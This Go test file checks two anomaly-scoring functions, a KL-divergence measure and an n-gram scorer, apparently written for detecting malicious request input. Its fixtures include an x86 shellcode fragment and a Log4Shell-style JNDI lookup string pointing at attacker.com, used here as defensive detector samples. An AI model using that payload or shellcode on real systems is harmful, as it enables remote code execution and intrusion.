package utils

import (
	"testing"
)

func TestCalculateKLDivergence(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		isLow    bool 
	}{
		{"Normal English", "The quick brown fox jumps over the lazy dog.", true},
		{"Valid URL Args", "id=123&name=john&admin=false", true},
		{"Binary Junk", "\x00\xff\x00\xff\x01\x02\x03\x04\x05", false},
		{"Shellcode", "\x31\xc0\x50\x68\x2f\x2f\x73\x68", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			div := CalculateKLDivergence(tt.input)
			if tt.isLow && div > 12.0 {
				t.Errorf("Expected low divergence for %s, got %.2f", tt.name, div)
			}
			if !tt.isLow && div < 3.0 {
				t.Errorf("Expected high divergence for %s, got %.2f", tt.name, div)
			}
		})
	}
}

func TestScoreNgrams(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		isHigh  bool
	}{
		{"Normal Text", "Hello world, this is a normal request body.", false},
		{"SQL Query", "SELECT * FROM users WHERE id=1", false},
		{"Shellcode-ish", "\x00\x01\x02\x03\xff\xfe\xfd", true},
		{"Obfuscated", "${jndi:ldap://attacker.com/a}", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			score := ScoreNgrams(tt.input)
			if tt.isHigh && score < 0.3 {
				t.Errorf("Expected high score for %s, got %.2f", tt.name, score)
			}
			if !tt.isHigh && score > 0.3 {
				t.Errorf("Expected low score for %s, got %.2f", tt.name, score)
			}
		})
	}
}
